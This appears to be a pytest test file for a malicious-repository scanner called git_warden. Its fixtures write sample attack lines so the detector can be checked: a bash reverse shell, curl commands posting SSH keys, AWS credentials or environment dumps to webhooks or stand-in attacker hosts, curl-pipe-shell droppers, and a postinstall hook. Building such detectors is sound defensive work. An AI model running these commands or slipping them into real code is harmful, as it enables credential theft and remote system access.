"""Tests for Tier-2 analysis (fixture dir; injected clone, no network)."""

from __future__ import annotations

from pathlib import Path

from git_warden.scanning.tier2 import analyze_repo, repo_code_hash, scan_candidate


def _make_malicious_repo(root: Path):
    (root / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        "curl https://discordapp.com/api/webhooks/1/x -d @~/.ssh/id_rsa\n",
        encoding="utf-8",
    )


def test_analyze_flags_malicious_repo(tmp_path):
    _make_malicious_repo(tmp_path)
    result = analyze_repo(tmp_path, "evil/repo")
    assert result.bash_score >= 5
    assert result.confirmed
    assert any(f.category == "reverse_shell" for f in result.bash_findings)
    # External scanners not installed in CI -> gracefully skipped.
    assert result.scanners["semgrep"].startswith("skipped")


def test_analyze_clean_repo_not_confirmed(tmp_path):
    (tmp_path / "build.sh").write_text("#!/bin/bash\nmake all\n", encoding="utf-8")
    result = analyze_repo(tmp_path, "good/repo")
    assert not result.confirmed
    assert result.bash_score == 0


def test_code_hash_is_stable_and_content_sensitive(tmp_path):
    (tmp_path / "a.sh").write_text("echo hi\n", encoding="utf-8")
    h1 = repo_code_hash(tmp_path)
    assert h1 == repo_code_hash(tmp_path)  # stable
    (tmp_path / "a.sh").write_text("echo bye\n", encoding="utf-8")
    assert repo_code_hash(tmp_path) != h1  # content-sensitive


def test_scan_candidate_with_injected_clone(tmp_path):
    def fake_clone(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        _make_malicious_repo(dest)
        return dest

    result = scan_candidate("evil/repo", tmp_path, clone=fake_clone)
    assert result is not None
    assert result.confirmed


def test_scan_candidate_returns_none_on_clone_failure(tmp_path):
    result = scan_candidate("x/y", tmp_path, clone=lambda *a, **k: None)
    assert result is None


def test_clone_rejects_invalid_full_name(tmp_path):
    from git_warden.scanning.tier2 import clone_repo
    # eval #16: traversal / non-allowlisted names rejected before any fs/clone op.
    assert clone_repo("a/../../evil", tmp_path / "d1") is None
    assert clone_repo("not-a-repo", tmp_path / "d2") is None
    assert clone_repo("owner/re po", tmp_path / "d3") is None


def test_enumeration_only_does_not_confirm(tmp_path):
    # Recon WITHOUT an action phase is not an attack (a recon tool, or CI debug).
    (tmp_path / "recon.sh").write_text(
        "whoami\nuname -a\nid\nhostname\nnetstat -an\nifconfig\n", encoding="utf-8"
    )
    result = analyze_repo(tmp_path, "x/y")
    assert not result.confirmed


def test_recon_and_exfil_implant_confirms(tmp_path):
    # A recon-and-report implant: enumeration piped to an ATTACKER host. The
    # exfil-to-attacker-host is itself a Tier-A signature (host-gated).
    (tmp_path / "implant.sh").write_text(
        "#!/bin/bash\nINFO=$(whoami; uname -a; id)\n"
        "curl -X POST http://185.220.101.5/c2 -d \"$INFO\"\n",
        encoding="utf-8",
    )
    result = analyze_repo(tmp_path, "evil/implant")
    assert result.confirmed
    cats = {f.category for f in result.bash_findings}
    assert "enumeration" in cats and "exfiltration" in cats


def test_secret_file_exfil_confirms_alone(tmp_path):
    # Posting a secret FILE out is credential theft regardless of host (Tier A).
    (tmp_path / "steal.sh").write_text(
        "#!/bin/bash\ncurl -d @~/.ssh/id_rsa https://collector.example.com/u\n",
        encoding="utf-8",
    )
    assert analyze_repo(tmp_path, "evil/grab").confirmed


def test_two_exfil_channels_without_cred_do_not_confirm(tmp_path):
    # tiledesk-server FP: a chat platform legitimately has a Telegram connector
    # AND a leftover webhook.site URL -- two exfil channels, no credential theft.
    (tmp_path / "telegram.js").write_text(
        "const url = 'https://api.telegram.org/bot123/sendMessage';\n", encoding="utf-8")
    (tmp_path / "httpUtil.js").write_text(
        "fetch('https://webhook.site/bd710929-9b43');\n", encoding="utf-8")
    assert not analyze_repo(tmp_path, "tiledesk/server").confirmed


def test_steal_and_send_confirms(tmp_path):
    # Reading a secret file AND an exfil channel = steal-and-send -> confirmed.
    (tmp_path / "x.js").write_text(
        "const k = require('fs').readFileSync(home + '/.aws/credentials');\n"
        "fetch('https://discord.com/api/webhooks/1/x', {method:'POST', body:k});\n",
        encoding="utf-8",
    )
    assert analyze_repo(tmp_path, "evil/stealer").confirmed


def test_ci_writing_deploy_key_does_not_confirm(tmp_path):
    # The opencode FP: CI legitimately WRITES a deploy key from a secret (it does
    # not read+exfil it). ssh-keys is a lone Tier-B -> not enough.
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "publish.yml").write_text(
        'steps:\n  - run: |\n      echo "$AUR_KEY" > ~/.ssh/id_rsa\n'
        "      chmod 600 ~/.ssh/id_rsa\n"
        "      curl -fsSL https://sh.rustup.rs | sh\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/tool").confirmed


def test_reverse_shell_confirms(tmp_path):
    # A single unambiguous network-attack signature confirms on its own.
    (tmp_path / "shell.sh").write_text(
        "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
    )
    assert analyze_repo(tmp_path, "evil/rsh").confirmed


def test_curl_install_reputable_host_does_not_confirm(tmp_path):
    # The opencode/PentestGPT false positives: curl|sh to reputable installers is
    # the standard developer idiom, not malware.
    (tmp_path / "install.sh").write_text(
        "#!/bin/bash\n"
        "curl -fsSL https://sh.rustup.rs | sh\n"
        "curl -fsSL https://bun.sh/install | bash\n"
        "curl -fsSL https://deb.nodesource.com/setup_20.x | bash -\n"
        "whoami; uname -a\n",   # recon co-occurs, but there is no attack
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/tool").confirmed


def test_curl_pipe_shell_attacker_host_confirms(tmp_path):
    # Same idiom, attacker host (bare IP) -> a dropper. Confirms alone (Tier A),
    # even though one download_exec is below the corroboration threshold.
    (tmp_path / "install.sh").write_text(
        "#!/bin/bash\ncurl -fsSL http://185.220.101.5/a.sh | sh\n", encoding="utf-8"
    )
    assert analyze_repo(tmp_path, "evil/dropper").confirmed


def test_lone_discord_webhook_needs_corroboration(tmp_path):
    # A project's own Discord notifier (Tier B) must not confirm on its own...
    (tmp_path / "notify.js").write_text(
        "fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'});\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed
    # ...but webhook + an env dump (Tier A) is real exfil.
    (tmp_path / "steal.js").write_text(
        "fetch('https://discord.com/api/webhooks/1/abc',"
        "{method:'POST',body:JSON.stringify(process.env)});\n",
        encoding="utf-8",
    )
    assert analyze_repo(tmp_path, "evil/app").confirmed


def test_semgrep_flag_alone_does_not_confirm(monkeypatch, tmp_path):
    # Semgrep --config auto flags ordinary code smells; on its own it must NOT
    # confirm a clean repo (would re-introduce the tiledesk FP in CI).
    import git_warden.scanning.tier2 as t2
    (tmp_path / "app.js").write_text("export const add = (a, b) => a + b;\n", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = '{"results": [{"check_id": "smell"}], "errors": []}' if cmd[0] == "semgrep" \
                else "{}"
            stderr = ""
        return R()

    result = analyze_repo(tmp_path, "legit/app", runner=runner)
    assert result.scanners["semgrep"] == "flagged"
    assert not result.confirmed  # semgrep smell != malware


def test_guarddog_flag_confirms(monkeypatch, tmp_path):
    # A malware-specific scanner (GuardDog) flagging IS sufficient to confirm.
    import json as _json

    import git_warden.scanning.tier2 as t2
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = _json.dumps({"issues": 1}) if cmd[0] == "guarddog" else "{}"
            stderr = ""
        return R()

    assert analyze_repo(tmp_path, "evil/pkg", runner=runner).confirmed


def test_run_external_semgrep_flags_only_on_results(monkeypatch, tmp_path):
    import json as _json

    import git_warden.scanning.tier2 as t2
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def _resp(returncode, payload):
        class R:
            pass
        r = R()
        r.returncode, r.stdout, r.stderr = returncode, _json.dumps(payload), ""
        return r

    def flag_runner(cmd, **k):
        return _resp(1, {"results": [{"check_id": "x"}], "errors": []})

    def err_runner(cmd, **k):
        return _resp(2, {"results": [], "errors": [{"message": "boom"}]})

    def clean_runner(cmd, **k):
        return _resp(0, {"results": [], "errors": []})

    assert t2._run_external("semgrep", tmp_path, flag_runner) == "flagged"
    assert t2._run_external("semgrep", tmp_path, err_runner) == "error"
    assert t2._run_external("semgrep", tmp_path, clean_runner) == "clean"


def test_clone_rejects_trailing_newline_in_full_name(tmp_path):
    from git_warden.scanning.tier2 import clone_repo
    assert clone_repo("owner/repo\n", tmp_path / "d") is None  # fullmatch, not $


def test_force_rmtree_removes_readonly_files(tmp_path):
    import os
    import stat

    from git_warden.scanning.tier2 import _force_rmtree
    sub = tmp_path / "tree" / "sub"
    sub.mkdir(parents=True)
    f = sub / "pack.idx"
    f.write_text("x", encoding="utf-8")
    os.chmod(f, stat.S_IREAD)  # simulate git read-only pack file
    _force_rmtree(tmp_path / "tree")
    assert not (tmp_path / "tree").exists()


def test_force_rmtree_noop_on_missing(tmp_path):
    from git_warden.scanning.tier2 import _force_rmtree
    _force_rmtree(tmp_path / "nope")  # must not raise


def test_scan_candidate_removes_dest_after_scan(tmp_path):
    captured = {}

    def clone_capture(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
        captured["dest"] = dest
        return dest

    result = scan_candidate("o/r", tmp_path, clone=clone_capture)
    assert result is not None
    assert not captured["dest"].exists()  # force-removed on success, no accumulation


def test_lineage_confirm_categories_ignore_tool_own_code(tmp_path):
    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
    # A red-team tool's OWN reverse shell must NOT confirm under lineage rules.
    (tmp_path / "agent.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
    )
    res = analyze_repo(tmp_path, "evil/sliver-fork", confirm_categories=WEAPONIZATION_CATEGORIES)
    assert not res.confirmed  # reverse_shell is not a weaponization category


def test_lineage_confirm_on_added_install_hook(tmp_path):
    import json as _j

    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
    # A weaponized fork that ADDED a malicious install hook DOES confirm.
    (tmp_path / "package.json").write_text(
        _j.dumps({"scripts": {"postinstall": "curl http://evil|sh"}}), encoding="utf-8"
    )
    res = analyze_repo(tmp_path, "evil/sliver-weaponized",
                       confirm_categories=WEAPONIZATION_CATEGORIES)
    assert res.confirmed


def test_restrict_paths_limits_findings(tmp_path):
    (tmp_path / "tool.sh").write_text("curl -d @x http://evil\n", encoding="utf-8")
    (tmp_path / "added.sh").write_text("curl -d @y http://evil\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "o/r", restrict_paths={"added.sh"})
    assert {f.file for f in res.bash_findings} == {"added.sh"}
